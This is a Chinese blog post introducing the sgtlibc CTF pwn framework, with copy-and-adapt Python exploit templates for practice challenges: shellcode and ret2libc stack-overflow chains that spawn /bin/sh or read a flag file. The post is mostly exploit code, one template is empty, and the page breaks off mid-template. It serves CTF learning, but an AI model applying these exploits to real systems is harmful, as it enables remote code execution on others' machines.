<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTF比赛PWN题sgtlibc通用快速解题框架 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CTF比赛PWN题sgtlibc通用快速解题框架" />
<meta property="og:description" content="CTF比赛PWN题sgtlibc通用快速解题框架 安装 开源地址：https://github.com/serfend/sgtlibc
使用 pip install sgtlibc -U 安装pwn解题框架
示例demo 目前收集了一些栈溢出上的通用解题框架，基本上对于简单题可以做到稍加修改配置即可解题，以实现1分钟得到flag效果。
libc泄露模板 说明 模板可以在github-pwn下载原始文件通常对于栈溢出的题，找到溢出点以后双击其buffer得到栈结构。观察得到r(return address)之前的长度。 将该长度填写到模板中相应位置，通常是 exp()中的b’a’ * [这里写长度]即可。 注意有的题main函数没有符号，导致无法通过 elf.symbols[‘main’]获取的，可以是在ida中找到入口函数地址，复制其值 将 main_addr = elf.symbols[&#39;main&#39;]改为 main_addr = 0x这里写地址 即可 在libc2.27版本以后，栈溢出需要检查栈是否平衡，可以是在返回地址前面加上一个 payload &#43;= [elf.rop[&#39;ret&#39;]]以解决。有时候题目会有一些输出，需要使用sla(sendlineafter)或ru(receive until)等方式将这些值过滤掉，以得到需要的数据。 模板 以下是一些可以修改一些参数即可立马运行的模板，业内称之为板子，1分钟交flag不是梦。
shellcode_binbash_x86 例题：buuctf start
import sgtlibc import sgtlibc.utils import sgtlibc.utils.shell from sgtlibc.gamebox import * set_config(GameBoxConfig( is_local=True, file=&#39;./start&#39;, remote=&#39;192.168.2.0:8888&#39;, auto_load=True, auto_show_rop=True, auto_show_summary=True, auto_start_game=True, auto_load_shell_str=True, auto_show_symbols=True )) s = sgtlibc.Searcher() elf = client.elf pause() read_addr = 0x08048087 # 再次读入 padding = 0x48 - 0x34 # 判断返回地址到输入值的偏移 sa(b&#39;:&#39;, [b&#39;a&#39; * padding, read_addr]) stack_addr = u00(rc(4)) print(f&#39;stack_addr:{hex(stack_addr)}&#39;) shellcode = sgtlibc." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/6fb27c34dbcc367c095ac7a8fb0be2b5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-15T16:35:10+08:00" />
<meta property="article:modified_time" content="2022-07-15T16:35:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTF比赛PWN题sgtlibc通用快速解题框架</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="CTFPWNsgtlibc_0"></a>CTF比赛PWN题sgtlibc通用快速解题框架</h2> 
<h3><a id="_2"></a>安装</h3> 
<p>开源地址：https://github.com/serfend/sgtlibc</p> 
<p>使用 <code>pip install sgtlibc -U</code> 安装pwn解题框架</p> 
<h3><a id="demo_10"></a>示例demo</h3> 
<blockquote> 
 <p>目前收集了一些栈溢出上的通用解题框架，基本上对于简单题可以做到稍加修改配置即可解题，以实现1分钟得到flag效果。</p> 
</blockquote> 
<ul><li>libc泄露模板</li></ul> 
<p><img src="https://images2.imgbox.com/9f/27/SLo54vSh_o.png" alt="image-20220615110400600"></p> 
<h3><a id="_20"></a>说明</h3> 
<ul><li>模板可以在<a href="https://github.com/serfend/sgtlibc/tree/main/samples/CTF-pwn-template">github-pwn</a>下载原始文件</li><li>通常对于栈溢出的题，找到溢出点以后双击其buffer得到栈结构。观察得到r(return address)之前的长度。 
  <ul><li><img src="https://images2.imgbox.com/4b/0f/A4XMBryt_o.png" alt="image-20220615110649571"></li><li>将该长度填写到模板中相应位置，通常是 exp()中的b’a’ * [这里写长度]即可。</li></ul> </li><li>注意有的题main函数没有符号，导致无法通过 elf.symbols[‘main’]获取的，可以是在ida中找到入口函数地址，复制其值 
  <ul><li>将 <code>main_addr = elf.symbols['main']</code>改为 <code>main_addr = 0x这里写地址</code> 即可</li></ul> </li><li>在libc2.27版本以后，栈溢出需要检查栈是否平衡，可以是在返回地址前面加上一个 <code>payload += [elf.rop['ret']]</code>以解决。</li><li>有时候题目会有一些输出，需要使用sla(sendlineafter)或ru(receive until)等方式将这些值过滤掉，以得到需要的数据。</li></ul> 
<h3><a id="_33"></a>模板</h3> 
<blockquote> 
 <p>以下是一些可以修改一些参数即可立马运行的模板，业内称之为板子，1分钟交flag不是梦。</p> 
</blockquote> 
<h4><a id="shellcode_binbash_x86_37"></a>shellcode_binbash_x86</h4> 
<p>例题：<a href="https://buuoj.cn/challenges#pwnable_start" rel="nofollow">buuctf start</a></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>utils
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>shell
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./start'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
read_addr <span class="token operator">=</span> <span class="token number">0x08048087</span> <span class="token comment"># 再次读入</span>
padding <span class="token operator">=</span> <span class="token number">0x48</span> <span class="token operator">-</span> <span class="token number">0x34</span> <span class="token comment"># 判断返回地址到输入值的偏移</span>
sa<span class="token punctuation">(</span>b<span class="token string">':'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> padding<span class="token punctuation">,</span> read_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
stack_addr <span class="token operator">=</span> u00<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'stack_addr:{hex(stack_addr)}'</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>shell<span class="token punctuation">.</span>shellcode86<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> padding<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>stack_addr <span class="token operator">+</span> padding<span class="token punctuation">]</span> <span class="token comment"># 返回地址为shellcode开头位置</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>shellcode<span class="token punctuation">]</span>
se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="system_bss_binsh_direct_x64_76"></a>system_bss_binsh_direct_x64</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./pwn'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">672</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


bss_align20_addr <span class="token operator">=</span> <span class="token number">0x00601079</span>
payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bss_align20_addr<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bss_align20_addr<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="shellcode_orw_x86_119"></a>shellcode_orw_x86</h4> 
<p>例题：<a href="https://buuoj.cn/challenges#pwnable_orw" rel="nofollow">buuctf pwnable_orw</a></p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> argparse <span class="token keyword">import</span> ArgumentError
<span class="token keyword">from</span> typing <span class="token keyword">import</span> Callable
<span class="token keyword">from</span> sgtpyutils<span class="token punctuation">.</span>logger <span class="token keyword">import</span> logger

set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./orw'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>


s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

sh <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token string">'esp'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>
sh <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'esp'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> asm<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>

interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="libcleak_x86_puts_158"></a>libc-leak_x86_puts</h4> 
<p>例题:<a href="https://ctf.show/challenges#%E7%AD%BE%E5%88%B0%E9%A2%98-194" rel="nofollow">ctfshow ret2libc_64 内部赛_签到题</a></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./5afea37c3946a'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


main_addr <span class="token operator">=</span> <span class="token number">0x0804859D</span> <span class="token comment"># elf.symbols['main']</span>
plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>plt_write<span class="token punctuation">,</span> main_addr<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">]</span>
    <span class="token comment"># 如果是read的话则sa，如果是gets scanf的话则sl</span>
    sla<span class="token punctuation">(</span><span class="token string">'information: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    <span class="token comment"># 清空输出</span>
    <span class="token comment"># ru('Hello,')</span>
    <span class="token comment"># rl()</span>
    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># 32位接收4个</span>
    data <span class="token operator">=</span> u00<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak {func}:{hex(data)}'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
<span class="token comment"># leak('printf')</span>
leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
<span class="token comment"># leak('stdout')</span>
<span class="token comment"># leak('stdin')</span>
leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>

<span class="token comment"># 如果给了libc则可以直接使用</span>
<span class="token comment"># libc = ELF('libc_buu-2.23_x64.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>

data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># choose your system index</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>

ret_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ret_addr<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>system_addr<span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="libcleak_x86_write_pure_239"></a>libc-leak_x86_write_pure</h4> 
<p>例题:<a href="https://buuoj.cn/challenges#jarvisoj_level1" rel="nofollow">buuctf jarvisoj_level1</a></p> 
<pre><code class="prism language-python">
</code></pre> 
<h4><a id="libcleak_x86_write_with_bss_249"></a>libc-leak_x86_write_with_bss</h4> 
<p>例题:<a href="https://buuoj.cn/challenges#%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN" rel="nofollow">buuctf [Black Watch 入群题]PWN</a></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>gamebox
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>shell <span class="token keyword">import</span> check_shell_validate
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
<span class="token keyword">import</span> os

set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./level1'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>

s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>  <span class="token comment"># write()</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>  <span class="token comment"># elf.symbols['vuln']</span>


canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


pause<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># write(1,buffer,4)</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>plt_write<span class="token punctuation">,</span> main_addr<span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>
    <span class="token comment"># 如果是read的话则sa，如果是gets scanf的话则sl</span>
    se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># 32位接收4个</span>
    data <span class="token operator">=</span> u00<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak {func} : {hex(data)}'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
addr <span class="token operator">=</span> leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
<span class="token comment"># leak('strlen')</span>
leak<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>
<span class="token comment"># leak('setbuf')</span>

<span class="token comment"># 如果给了libc则可以直接使用</span>
<span class="token comment"># libc = ELF('libc_buu-2.23_x86.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>

<span class="token comment"># 再次利用payload，溢出执行system</span>


<span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> <span class="token string">'ubuntu'</span> <span class="token keyword">in</span> x


data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span><span class="token builtin">filter</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ret_addr<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>system_addr<span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<blockquote> 
 <p>注意例题中存在一些交互判断，需要将判断通过（修改what is your name等的接收）</p> 
</blockquote> 
<h4><a id="libcleak_x64_puts_348"></a>libc-leak_x64_puts</h4> 
<p>例题:<a href="%E5%BF%98%E4%BA%86%E6%98%AF%E5%93%AA%E9%A2%98%E4%BA%86" rel="nofollow">buuctf ret2text</a></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>utils <span class="token keyword">import</span> shell
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets<span class="token punctuation">.</span>gadgets_exploit <span class="token keyword">import</span> gadget_by_csu
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./bypwn'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.107:9999'</span><span class="token punctuation">,</span>
